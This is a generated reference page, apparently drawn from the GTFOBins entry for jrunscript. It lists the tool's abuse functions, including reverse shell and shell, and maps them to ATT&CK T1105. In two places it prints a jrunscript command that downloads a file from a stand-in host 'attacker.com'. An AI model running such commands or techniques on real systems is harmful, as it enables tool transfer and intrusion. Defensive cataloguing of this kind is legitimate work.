---
parsed_by: focuslocust
source: gtfobins
type: generated
---
# jrunscript

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Type | `tool` |
| Record ID | `jrunscript` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/jrunscript` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Summary

GTFOBins entry for jrunscript covering download, file-read, file-write, reverse-shell, shell.

## Fast Retrieval

- Platform: `linux`
- Command page: [commands](../../commands/linux/jrunscript.md)
- Source verification: [source record](../../sources/gtfobins/jrunscript.md)

## Aliases

- `jrunscript`

## Related ATT&CK Techniques

| Item | Relationship | Confidence | Evidence |
| --- | --- | --- | --- |
| [T1105 - Ingress Tool Transfer](../../attack/techniques/T1105-ingress-tool-transfer.md) | inferred | high | Command appears to retrieve a remote file: jrunscript -e 'cp("http://attacker.com/path/to/input-file","/path/to/output-file")' |

## Source Verification

[source record](../../sources/gtfobins/jrunscript.md)

## Evidence Excerpt

```text
_body: ''
_name: jrunscript
_source_path: /home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/jrunscript
comment: This tool is installed starting with Java SE 6.
functions:
download:
- code: jrunscript -e 'cp("http://attacker.com/path/to/input-file","/path/to/output-file")'
contexts:
```
